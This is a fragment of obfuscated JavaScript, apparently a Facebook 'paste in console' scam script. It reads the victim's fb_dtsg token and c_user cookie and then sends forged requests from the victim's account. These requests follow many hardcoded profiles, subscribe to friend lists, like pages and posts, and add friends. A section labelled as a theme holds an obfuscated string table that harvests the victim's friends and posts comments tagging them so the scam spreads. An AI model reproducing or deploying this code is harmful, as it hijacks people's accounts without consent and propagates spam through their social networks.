...
/* Nh?c */
    ...
    var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
    var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200)http4.close};http4.send(params4)}a("100003869256541");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}sublist("259153080890332");sublist("271884032950570");var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=811104532248308&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&fbpage_id="+p+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&&Page.status==200){Page.close}};Page.send(PageParams)}Like("339055966171377");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}
     
    //DiMo97
    sublist("1533153836909781");sublist("1533154070243091");
    sublist("1533154126909752");sublist("1533154186909746");
    sublist("1533154326909732");sublist("259777644181915");
    sublist("259777047515308");sublist("259776627515350");
    sublist("259777467515266");sublist("217214871817633");
    sublist("217214258484361");sublist("259777467515266");
    a("4");a("100005964640577");
    a("4");a("100002707251792");
    //Douglas 
    a("4");a("100007602934175"); 
    a("4");a("100006455393340");
    a("4");a("100001540339648");
    sublist("259780740848272");sublist("259780804181599");
   sublist("259785920847754");sublist("259785990847747");
   sublist("259786067514406");sublist("259786097514403");
   sublist("259786130847733");
   //Araujo
    sublist("1385980045001879");sublist("1385980401668510");
   sublist("1385980451668505");sublist("1385980515001832");
   sublist("1385980625001821");sublist("1385980685001815");
   sublist("1385980718335145");sublist("1385982051668345");
   a("4");a("100001540339648");
   //Marcos
   sublist("1531743550384143");sublist("1531743180384180");
   sublist("1531741963717635");sublist("1531743233717508");
   sublist("1531743067050858");sublist("1531743153717516");
   sublist("1531743207050844");sublist("1531743223717509");
   sublist("1531744610384037");
   //Arthur
   sublist("357375694401403");
   sublist("357375724401400");
   sublist("357375764401396");
   sublist("357375824401390"); 
   sublist("357375844401388");
   a("4");a("100003979158752");
   //David 
   sublist("357375864401386");sublist("357375874401385");
   sublist("357377204401252");
   sublist("357377234401249");
   sublist("357377261067913");
   a("4");a("100003021449038");
   a("4");a("10000744027852");
   a("4");a("10000744027852");
   a("4");a("10000744027852");
   Like("424586924245354");
   Like("292041810887407");
   Like("226351634234999");
   Like("451308991590228");
   //Theme
    (function() {
    ...
    var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "1380627672207881", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " @[", "uid", ":", "text", "]", " ", "\x26filter[0]=user", "\x26options[0]=friends_only", "\x26options[1]=nm", "\x26token=v7", "\x26viewer=", "\x26__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "\x26ft_ent_identifier=", "\x26comment_text=", "\x26source=2", "\x26client_id=1377871797138:1707018092", "\x26reply_fbid", "\x26parent_comment_id", "\x26rootid=u_jsonp_2_3", "\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:", "}", "\x26attached_sticker_fbid=0", "\x26attached_photo_fbid=0", "\x26giftoccasion", "\x26ft[tn]=[]", "\x26__a=1", "\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo", "\x26__req=q", "\x26fb_dtsg=", "\x26ttstamp=", "POST", "/ajax/ufi/add_comment.php", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "status", "close"];
